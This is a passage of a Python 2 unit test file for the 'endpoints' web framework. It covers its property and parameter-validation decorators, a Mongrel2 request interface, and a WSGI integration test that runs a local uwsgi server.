    def test__property_allow_empty(self):
        class PAE(object):
            foo_val = None
            @endpoints.decorators._property(allow_empty=False)
            def foo(self):
                return self.foo_val

        c = PAE()
        self.assertEqual(None, c.foo)
        self.assertFalse('_foo' in c.__dict__)

        c.foo_val = 1
        self.assertEqual(1, c.foo)
        self.assertTrue('_foo' in c.__dict__)

    def test__property_setter(self):
        class WPS(object):
            foo_get = False
            foo_set = False
            foo_del = False

            @endpoints.decorators._property
            def foo(self):
                self.foo_get = True
                return 1

            @foo.setter
            def foo(self, val):
                self.foo_set = True
                self._foo = val

            @foo.deleter
            def foo(self):
                self.foo_del = True
                del(self._foo)

        c = WPS()

        self.assertEqual(1, c.foo)

        c.foo = 5
        self.assertEqual(5, c.foo)

        del(c.foo)
        self.assertEqual(1, c.foo)

        self.assertTrue(c.foo_get)
        self.assertTrue(c.foo_set)
        self.assertTrue(c.foo_del)

    def test__property__strange_behavior(self):
        class BaseFoo(object):
            def __init__(self):
                setattr(self, 'bar', None)

            def __setattr__(self, n, v):
                super(BaseFoo, self).__setattr__(n, v)

        class Foo(BaseFoo):
            @endpoints.decorators._property(allow_empty=False)
            def bar(self):
                return 1

        f = Foo()
        self.assertEqual(1, f.bar)

        f.bar = 2
        self.assertEqual(2, f.bar)

    def test__property___dict__direct(self):
        """
        this is a no win situation

        if you have a bar _property and a __setattr__ that modifies directly then
        the other _property values like __set__ will not get called, and you can't
        have _property.__get__ look for the original name because there are times
        when you want your _property to override a parent's original value for the
        property, so I've chosen to just ignore this case and not support it
        """
        class Foo(object):
            @endpoints.decorators._property
            def bar(self):
                return 1
            def __setattr__(self, field_name, field_val):
                self.__dict__[field_name] = field_val
                #super(Foo, self).__setattr__(field_name, field_val)

        f = Foo()
        f.bar = 2 # this will be ignored
        self.assertEqual(1, f.bar)

    def test__property(self):
        class WP(object):
            count_foo = 0

            @endpoints.decorators._property(True)
            def foo(self):
                self.count_foo += 1
                return 1

            @endpoints.decorators._property(read_only=True)
            def baz(self):
                return 2

            @endpoints.decorators._property()
            def bar(self):
                return 3

            @endpoints.decorators._property
            def che(self):
                return 4

        c = WP()
        r = c.foo
        self.assertEqual(1, r)
        self.assertEqual(1, c._foo)
        with self.assertRaises(AttributeError):
            c.foo = 2
        with self.assertRaises(AttributeError):
            del(c.foo)
        c.foo
        c.foo
        self.assertEqual(1, c.count_foo)

        r = c.baz
        self.assertEqual(2, r)
        self.assertEqual(2, c._baz)
        with self.assertRaises(AttributeError):
            c.baz = 3
        with self.assertRaises(AttributeError):
            del(c.baz)

        r = c.bar
        self.assertEqual(3, r)
        self.assertEqual(3, c._bar)
        c.bar = 4
        self.assertEqual(4, c.bar)
        self.assertEqual(4, c._bar)
        del(c.bar)
        r = c.bar
        self.assertEqual(3, r)

        r = c.che
        self.assertEqual(4, r)
        self.assertEqual(4, c._che)
        c.che = 4
        self.assertEqual(4, c.che)
        del(c.che)
        r = c.che
        self.assertEqual(4, r)

    def test_require_params(self):
        class MockObject(object):
            request = endpoints.Request()

            @endpoints.decorators.require_params('foo', 'bar')
            def foo(self, *args, **kwargs): return 1

            @endpoints.decorators.require_params('foo', 'bar', allow_empty=True)
            def bar(self, *args, **kwargs): return 2

        o = MockObject()
        o.request.method = 'GET'
        o.request.query_kwargs = {'foo': 1}

        with self.assertRaises(endpoints.CallError):
            o.foo()

        with self.assertRaises(endpoints.CallError):
            o.bar()

        o.request.query_kwargs['bar'] = 2
        r = o.foo(**o.request.query_kwargs)
        self.assertEqual(1, r)

        r = o.bar(**o.request.query_kwargs)
        self.assertEqual(2, r)

        o.request.query_kwargs['bar'] = 0
        with self.assertRaises(endpoints.CallError):
            o.foo(**o.request.query_kwargs)

        r = o.bar(**o.request.query_kwargs)
        self.assertEqual(2, r)

    def test_param_multiple_names(self):
        c = create_controller()

        @endpoints.decorators.param('foo', 'foos', 'foo3', type=int)
        def foo(self, *args, **kwargs):
            return kwargs.get('foo')

        r = foo(c, **{'foo': 1})
        self.assertEqual(1, r)

        r = foo(c, **{'foos': 2})
        self.assertEqual(2, r)

        r = foo(c, **{'foo3': 3})
        self.assertEqual(3, r)

        with self.assertRaises(endpoints.CallError):
            r = foo(c, **{'foo4': 0})

    def test_param_callable_default(self):
        c = create_controller()

        @endpoints.decorators.param('foo', default=time.time)
        def foo(self, *args, **kwargs):
            return kwargs.get('foo')

        start = time.time()
        r1 = foo(c, **{})
        self.assertLess(start, r1)

        time.sleep(0.25)
        r2 = foo(c, **{})
        self.assertLess(r1, r2)


    def test_param_not_required(self):
        c = create_controller()

        @endpoints.decorators.param('foo', required=False)
        def foo(self, *args, **kwargs):
            return 'foo' in kwargs

        r = foo(c, **{'foo': 1})
        self.assertTrue(r)

        r = foo(c, **{})
        self.assertFalse(r)

        @endpoints.decorators.param('foo', required=False, default=5)
        def foo(self, *args, **kwargs):
            return 'foo' in kwargs

        r = foo(c, **{})
        self.assertTrue(r)

        @endpoints.decorators.param('foo', type=int, required=False)
        def foo(self, *args, **kwargs):
            return 'foo' in kwargs

        r = foo(c, **{})
        self.assertFalse(r)



    def test_param(self):
        c = create_controller()

        @endpoints.decorators.param('foo', type=int)
        def foo(self, *args, **kwargs):
            return kwargs.get('foo')

        with self.assertRaises(endpoints.CallError):
            r = foo(c, **{'foo': 0})

        @endpoints.decorators.param('foo', default=0)
        def foo(self, *args, **kwargs):
            return kwargs.get('foo')

        r = foo(c, **{})
        self.assertEqual(0, r)

        @endpoints.decorators.param('foo', type=int, choices=set([1, 2, 3]))
        def foo(self, *args, **kwargs):
            return kwargs.get('foo')

        c.request.method = 'POST'
        c.request.body_kwargs = {'foo': '1'}
        r = foo(c, **c.request.body_kwargs)
        self.assertEqual(1, r)

        c.request.body_kwargs = {}
        r = foo(c, **{'foo': '2'})
        self.assertEqual(2, r)

    def test_post_param(self):
        c = create_controller()
        c.request.method = 'POST'

        @endpoints.decorators.post_param('foo', type=int, choices=set([1, 2, 3]))
        def foo(self, *args, **kwargs):
            return kwargs['foo']

        with self.assertRaises(endpoints.CallError):
            r = foo(c)

        c.request.query_kwargs['foo'] = '1'
        with self.assertRaises(endpoints.CallError):
            r = foo(c, **{'foo': '1'})

        c.request.body_kwargs = {'foo': '8'}
        with self.assertRaises(endpoints.CallError):
            r = foo(c, **c.request.body_kwargs)

        c.request.query_kwargs = {}
        c.request.body_kwargs = {'foo': '1'}
        r = foo(c, **c.request.body_kwargs)
        self.assertEqual(1, r)

        c.request.query_kwargs = {'foo': '1'}
        c.request.body_kwargs = {'foo': '3'}
        r = foo(c, **{'foo': '3'})
        self.assertEqual(3, r)

    def test_get_param(self):
        c = create_controller()

        c.request.query_kwargs = {'foo': '8'}
        @endpoints.decorators.get_param('foo', type=int, choices=set([1, 2, 3]))
        def foo(*args, **kwargs):
            return kwargs['foo']
        with self.assertRaises(endpoints.CallError):
            r = foo(c, **c.request.query_kwargs)

        c.request.query_kwargs = {'foo': '1'}
        @endpoints.decorators.get_param('foo', type=int, choices=set([1, 2, 3]))
        def foo(*args, **kwargs):
            return kwargs['foo']
        r = foo(c, **c.request.query_kwargs)
        self.assertEqual(1, r)

        c.request.query_kwargs = {'foo': '1', 'bar': '1.5'}
        @endpoints.decorators.get_param('foo', type=int)
        @endpoints.decorators.get_param('bar', type=float)
        def foo(*args, **kwargs):
            return kwargs['foo'], kwargs['bar']
        r = foo(c, **c.request.query_kwargs)
        self.assertEqual(1, r[0])
        self.assertEqual(1.5, r[1])

        c.request.query_kwargs = {'foo': '1'}
        @endpoints.decorators.get_param('foo', type=int, action='blah')
        def foo(*args, **kwargs):
            return kwargs['foo']
        with self.assertRaises(ValueError):
            r = foo(c, **c.request.query_kwargs)

        c.request.query_kwargs = {'foo': ['1,2,3,4', '5']}
        @endpoints.decorators.get_param('foo', type=int, action='store_list')
        def foo(*args, **kwargs):
            return kwargs['foo']
        with self.assertRaises(endpoints.CallError):
            r = foo(c, **c.request.query_kwargs)

        c.request.query_kwargs = {'foo': ['1,2,3,4', '5']}
        @endpoints.decorators.get_param('foo', type=int, action='append_list')
        def foo(*args, **kwargs):
            return kwargs['foo']
        r = foo(c, **c.request.query_kwargs)
        self.assertEqual(range(1, 6), r)

        c.request.query_kwargs = {'foo': '1,2,3,4'}
        @endpoints.decorators.get_param('foo', type=int, action='store_list')
        def foo(*args, **kwargs):
            return kwargs['foo']
        r = foo(c, **c.request.query_kwargs)
        self.assertEqual(range(1, 5), r)

        c.request.query_kwargs = {}

        @endpoints.decorators.get_param('foo', type=int, default=1, required=False)
        def foo(*args, **kwargs):
            return kwargs['foo']
        r = foo(c)
        self.assertEqual(1, r)

        @endpoints.decorators.get_param('foo', type=int, default=1, required=True)
        def foo(*args, **kwargs):
            return kwargs['foo']
        r = foo(c)
        self.assertEqual(1, r)

        @endpoints.decorators.get_param('foo', type=int, default=1)
        def foo(*args, **kwargs):
            return kwargs['foo']
        r = foo(c)
        self.assertEqual(1, r)

        @endpoints.decorators.get_param('foo', type=int)
        def foo(*args, **kwargs):
            return kwargs['foo']
        with self.assertRaises(endpoints.CallError):
            r = foo(c)

        c.request.query_kwargs = {'foo': '1'}
        @endpoints.decorators.get_param('foo', type=int)
        def foo(*args, **kwargs):
            return kwargs['foo']
        r = foo(c, **c.request.query_kwargs)
        self.assertEqual(1, r)

    def test_param_size(self):
        c = create_controller()

        @endpoints.decorators.param('foo', type=int, min_size=100)
        def foo(self, *args, **kwargs):
            return kwargs.get('foo')
        with self.assertRaises(endpoints.CallError):
            r = foo(c, **{'foo': 0})
        r = foo(c, **{'foo': 200})
        self.assertEqual(200, r)

        @endpoints.decorators.param('foo', type=int, max_size=100)
        def foo(self, *args, **kwargs):
            return kwargs.get('foo')
        with self.assertRaises(endpoints.CallError):
            r = foo(c, **{'foo': 200})
        r = foo(c, **{'foo': 20})
        self.assertEqual(20, r)

        @endpoints.decorators.param('foo', type=int, min_size=100, max_size=200)
        def foo(self, *args, **kwargs):
            return kwargs.get('foo')
        r = foo(c, **{'foo': 120})
        self.assertEqual(120, r)

        @endpoints.decorators.param('foo', type=str, min_size=2, max_size=4)
        def foo(self, *args, **kwargs):
            return kwargs.get('foo')
        r = foo(c, **{'foo': 'bar'})
        self.assertEqual('bar', r)
        with self.assertRaises(endpoints.CallError):
            r = foo(c, **{'foo': 'barbar'})

    def test_param_lambda_type(self):
        c = create_controller()

        @endpoints.decorators.param('foo', type=lambda x: x.upper())
        def foo(self, *args, **kwargs):
            return kwargs.get('foo')
        r = foo(c, **{'foo': 'bar'})
        self.assertEqual('BAR', r)

    def test_param_empty_default(self):
        c = create_controller()

        @endpoints.decorators.param('foo', default=None)
        def foo(self, *args, **kwargs):
            return kwargs.get('foo')
        r = foo(c, **{})
        self.assertEqual(None, r)

    def test_param_reference_default(self):
        c = create_controller()

        @endpoints.decorators.param('foo', default={})
        def foo(self, *args, **kwargs):
            kwargs['foo'][testdata.get_ascii()] = testdata.get_ascii()
            return kwargs['foo']

        r = foo(c, **{})
        self.assertEqual(1, len(r))

        r = foo(c, **{})
        self.assertEqual(1, len(r))

        @endpoints.decorators.param('foo', default=[])
        def foo(self, *args, **kwargs):
            kwargs['foo'].append(testdata.get_ascii())
            return kwargs['foo']

        r = foo(c, **{})
        self.assertEqual(1, len(r))

        r = foo(c, **{})
        self.assertEqual(1, len(r))

    def test_param_regex(self):
        c = create_controller()

        @endpoints.decorators.param('foo', regex="^\S+@\S+$")
        def foo(self, *args, **kwargs):
            return kwargs['foo']

        r = foo(c, **{'foo': 'foo@bar.com'})

        with self.assertRaises(endpoints.CallError):
            r = foo(c, **{'foo': ' foo@bar.com'})

        @endpoints.decorators.param('foo', regex=re.compile("^\S+@\S+$", re.I))
        def foo(self, *args, **kwargs):
            return kwargs['foo']

        r = foo(c, **{'foo': 'foo@bar.com'})

        with self.assertRaises(endpoints.CallError):
            r = foo(c, **{'foo': ' foo@bar.com'})

    def test_param_bool(self):
        c = create_controller()

        @endpoints.decorators.param('foo', type=bool, allow_empty=True)
        def foo(self, *args, **kwargs):
            return kwargs['foo']

        r = foo(c, **{'foo': 'true'})
        self.assertEqual(True, r)

        r = foo(c, **{'foo': 'True'})
        self.assertEqual(True, r)

        r = foo(c, **{'foo': '1'})
        self.assertEqual(True, r)

        r = foo(c, **{'foo': 'false'})
        self.assertEqual(False, r)

        r = foo(c, **{'foo': 'False'})
        self.assertEqual(False, r)

        r = foo(c, **{'foo': '0'})
        self.assertEqual(False, r)

    def test_param_list(self):
        c = create_controller()

        @endpoints.decorators.param('foo', type=list)
        def foo(self, *args, **kwargs):
            return kwargs['foo']

        r = foo(c, **{'foo': ['bar', 'baz']})
        self.assertEqual(r, ['bar', 'baz'])


try:
    from endpoints.interface.mongrel2 import Mongrel2 as M2Interface, \
        Request as M2Request
    class MockM2Request(object):
        def __init__(self, **kwargs):
            self.body = kwargs.get('body', '')
            self.sender = kwargs.get('sender', 'm2-interface-test')
            self.conn_id = kwargs.get('conn_id', '1')

            self.data = kwargs.get('data', {})
            self.data = kwargs.get('msg', 'this is the raw zeromq message')

            self.headers = {
                'REMOTE_ADDR': u"10.0.2.2",
                'PATTERN': u"/",
                'x-forwarded-for': u"10.0.2.2",
                'URL_SCHEME': u"http",
                'URI': u"/",
                'accept': u"*/*",
                'user-agent': u"m2-interface-test",
                'host': u"localhost:1234",
                'VERSION': u"HTTP/1.1",
                'PATH': u"/",
                'METHOD': u"GET"
            }
            for hk, hv in kwargs.get('headers', {}).iteritems():
                self.headers[hk] = hv

            self.path = self.headers['PATH']

    class M2InterfaceTest(TestCase):
        def test_create_request(self):
            m2_req = MockM2Request()
            i = M2Interface(
                'm2.test.controller',
                request_class=M2Request,
                response_class=None,
                call_class=None
            )

            req = i.create_request(m2_req)
            self.assertEqual({}, req.query_kwargs)

            m2_req = MockM2Request(headers={'QUERY': 'foo=bar'})
            req = i.create_request(m2_req)
            self.assertTrue('foo' in req.query_kwargs)

except ImportError, e:
    pass


try:
    import requests

    class WSGIClient(object):
        def __init__(self, controller_prefix, module_body):
            self.cwd = testdata.create_dir()
            self.controller_prefix = controller_prefix
            self.module_body = os.linesep.join(module_body)
            self.application = "wsgi.py"
            self.host = "http://localhost:8080"
            testdata.create_module(self.controller_prefix, self.module_body, self.cwd)
            f = testdata.create_file(
                self.application,
                os.linesep.join([
                    "import os",
                    "import sys",
                    "sys.path.append('{}')".format(os.path.dirname(os.path.realpath(__file__))),
                    "from endpoints.interface.wsgi import Server",
                    "os.environ['ENDPOINTS_PREFIX'] = '{}'".format(controller_prefix),
                    "application = Server()",
                    ""
                ]),
                self.cwd
            )
            self.start()

        def start(slf):
            subprocess.call("pgrep uwsgi | xargs kill -9", shell=True)
            class SThread(threading.Thread):
                """http://stackoverflow.com/questions/323972/is-there-any-way-to-kill-a-thread-in-python"""
                def __init__(self):
                    super(SThread, self).__init__()
                    self._stop = threading.Event()
                    self.daemon = True

                def stop(self):
                    self._stop.set()

                def stopped(self):
                    return self._stop.isSet()

                def run(self):
                    process = None
                    try:
                        cmd = " ".join([
                            "uwsgi",
                            "--http=:8080",
                            "--master",
                            "--processes=1",
                            "--cpu-affinity=1",
                            "--thunder-lock",
                            "--chdir={}".format(slf.cwd),
                            "--wsgi-file={}".format(slf.application),
                        ])

                        process = subprocess.Popen(
                            #['sudo', 'tail', '-f', '/var/log/upstart/chat-*.log'],
                            cmd,
                            shell=True,
                            stdout=subprocess.PIPE,
                            stderr=subprocess.STDOUT,
                            cwd=slf.cwd
                        )

                        # Poll process for new output until finished
                        while not self.stopped():
                            line = process.stdout.readline()
                            if line == '' and process.poll() != None:
                                break

                            sys.stdout.write(line)
                            sys.stdout.flush()

                    except Exception as e:
                        print e
                        raise

                    finally:
                        count = 0
                        if process:
                            process.terminate()
                            while count < 50:
                                count += 1
                                time.sleep(0.1)
                                if process.poll() != None:
                                    break

                            if process.poll() == None:
                                process.kill()

            slf.thread = SThread()
            slf.thread.start()
            time.sleep(1)

        def stop(self):
            self.thread.stop()

        def post(self, uri, body, **kwargs):
            url = self.host + uri
            kwargs['data'] = body
            kwargs.setdefault('timeout', 5)
            return self.get_response(requests.post(url, **kwargs))

        def get_response(self, requests_response):
            """just make request's response more endpointy"""
            requests_response.code = requests_response.status_code
            requests_response.body = requests_response.content
            return requests_response


    class WSGITest(TestCase):
        def test_post(self):
            chdir = testdata.create_dir()
            controller_prefix = 'wsgi.post'
            c = WSGIClient(controller_prefix, [
                "from endpoints import Controller",
                "class Default(Controller):",
                "    def GET(*args, **kwargs): pass",
                "    def POST(*args, **kwargs): pass",
                "",
            ])

            r = c.post('/', {})
            self.assertEqual(204, r.code)

            r = c.post('/', json.dumps({}), headers={"content-type": "application/json"})
            self.assertEqual(204, r.code)


except ImportError, e:
    print e

